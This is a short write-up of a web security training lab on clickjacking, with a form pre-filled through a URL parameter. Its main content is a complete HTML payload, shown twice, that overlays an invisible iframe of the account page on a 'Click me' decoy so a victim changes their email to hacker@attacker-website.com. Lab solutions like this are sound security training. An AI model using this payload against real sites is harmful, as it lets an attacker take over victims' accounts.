# Lab: Clickjacking with form input data prefilled from a URL parameter (Apprentice)

**Goal:** Change the victim's email address by pre-filling the form via URL parameter and making them click "Update email".

**Credentials:** `wiener:peter`

## Vulnerability
Email form accepts a pre-filled value from the `email` query parameter. Page can be framed.

## Solution

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

### Notes
- Use a different email than your own when delivering the final exploit (you cannot register an already-taken email).
- Align the "Update email" button under the decoy (suggested: top 400px, left 80px).
- Test with opacity 0.1 first.

## Final Exploit Payload
```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```
